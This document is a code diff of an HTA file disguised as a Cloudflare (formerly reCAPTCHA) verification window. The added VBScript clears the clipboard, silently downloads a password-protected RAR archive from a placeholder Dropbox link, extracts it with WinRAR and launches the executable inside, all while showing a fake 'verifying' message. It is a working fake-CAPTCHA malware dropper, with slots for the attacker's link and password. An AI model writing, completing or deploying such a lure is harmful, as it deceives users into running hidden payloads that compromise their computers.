@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>reCAPTCHA Verification</title>
+    <title>CLOUDFLARE Verification</title>
     <HTA:APPLICATION
-        APPLICATIONNAME="reCAPTCHA Verification"
+        APPLICATIONNAME="CLOUDFLARE Verification"
         BORDER="thin"
         BORDERSTYLE="normal"
         ICON="https://support.google.com/favicon.ico"
@@ -52,19 +52,17 @@
         Window.ResizeTo 520, 480
         Window.MoveTo (Screen.Width - 300) / 2, (Screen.Height - 400) / 2
 
-        Set objShell = CreateObject("WScript.Shell")
-        objShell.Run "calc.exe", 0, False  ' Just for fun
+        ' Clear clipboard just in case
+        Call ClearClipboard
 
-        ClearClipboard
+        ' Download the password-protected .rar file from Dropbox
+        Call DownloadRAR
 
-        objShell.Run "cmd.exe /c timeout /T 2 /nobreak", 0, True
-        Call HideConnectingShowError
-        objShell.Run "cmd.exe /c timeout /T 1 /nobreak", 0, True
-    End Sub
+        ' Extract the .rar file with password using WinRAR
+        Call ExtractRAR
 
-    Sub HideConnectingShowError
-        document.getElementById("connecting").style.display = "none"
-        document.getElementById("error").style.display = "block"
+        ' Run the extracted executable (change name as needed)
+        Call RunExtractedFile
     End Sub
 
     Sub ClearClipboard
@@ -73,15 +71,69 @@
         objHTML.parentWindow.clipboardData.setData "text", ""
         Set objHTML = Nothing
     End Sub
-    </script>
+
+    Sub DownloadRAR()
+        Dim url, filePath, xhttp, stream
+        url = "https://www.dropbox.com/s/your_file_path/yourfile.rar?dl=1" ' <-- Put your Dropbox direct download link here
+        filePath = "C:\Users\Public\file.rar"
+
+        Set xhttp = CreateObject("MSXML2.XMLHTTP")
+        xhttp.Open "GET", url, False
+        xhttp.Send
+
+        If xhttp.Status = 200 Then
+            Set stream = CreateObject("ADODB.Stream")
+            stream.Type = 1 ' Binary
+            stream.Open
+            stream.Write xhttp.responseBody
+            stream.SaveToFile filePath, 2 ' Overwrite if exists
+            stream.Close
+        Else
+            MsgBox "Failed to download file. Status: " & xhttp.Status, vbCritical, "Download Error"
+        End If
+    End Sub
+
+    Sub ExtractRAR()
+        Dim objShell, rarPath, rarFile, extractPath, password, cmd
+
+        ' Adjust this path if WinRAR is installed somewhere else
+        rarPath = """C:\Program Files\WinRAR\WinRAR.exe"""
+
+        rarFile = "C:\Users\Public\file.rar"
+        extractPath = "C:\Users\Public\extracted\"
+        password = "YourPassword" ' <-- Put the password here
+
+        ' Create extraction folder if it doesn't exist
+        Set objFSO = CreateObject("Scripting.FileSystemObject")
+        If Not objFSO.FolderExists(extractPath) Then
+            objFSO.CreateFolder(extractPath)
+        End If
+
+        cmd = rarPath & " x -p" & password & " -y " & """" & rarFile & """" & " " & """" & extractPath & """"
+
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run cmd, 0, True
+    End Sub
+
+    Sub RunExtractedFile()
+        Dim objShell, exePath
+
+        ' Change "program.exe" to the actual executable you want to run from the extracted folder
+        exePath = "C:\Users\Public\extracted\program.exe"
+
+        Set objShell = CreateObject("WScript.Shell")
+        objShell.Run Chr(34) & exePath & Chr(34), 0, False
+    End Sub
+</script>
+
 </head>
 <body>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/2048px-RecaptchaLogo.svg.png" alt="reCAPTCHA Logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Cloudflare_Logo.svg/2560px-Cloudflare_Logo.svg.png" alt="reCAPTCHA Logo">
     <div id="connecting" style="display:block;">
-        <p>Verifying reCAPTCHA, please wait...</p>
+        <p>Verifying CLOUDFLARE, please wait...</p>
     </div>
     <div id="error" style="display:none;">
-        <p><b>Failed to connect with the reCAPTCHA server.</b><br>Try the verification steps again.</p>
+        <p><b>Failed to connect with the CLOUDFLARE server.</b><br>Try the verification steps again.</p>
     </div>
     <p class="terms">
         <a href="https://www.google.com/intl/en/policies/privacy/">Privacy</a> - 
